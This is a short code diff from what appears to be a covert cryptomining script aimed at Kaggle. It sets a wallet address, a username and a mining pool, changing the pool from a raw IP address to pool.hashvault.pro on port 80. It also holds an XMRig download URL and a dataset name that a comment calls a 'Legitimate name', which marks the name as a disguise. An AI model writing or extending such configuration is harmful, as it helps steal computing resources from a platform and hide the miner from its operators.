@@ -20,7 +20,7 @@ log = get_logger('kaggle')
 # ============================================================================
 USER = "ashleehunter049877"
 WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
-POOL = "45.155.102.89:10128"
+POOL = "pool.hashvault.pro:80"
 XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
 DATASET_NAME = "gpu-compute-optimizer"  # Legitimate name
 
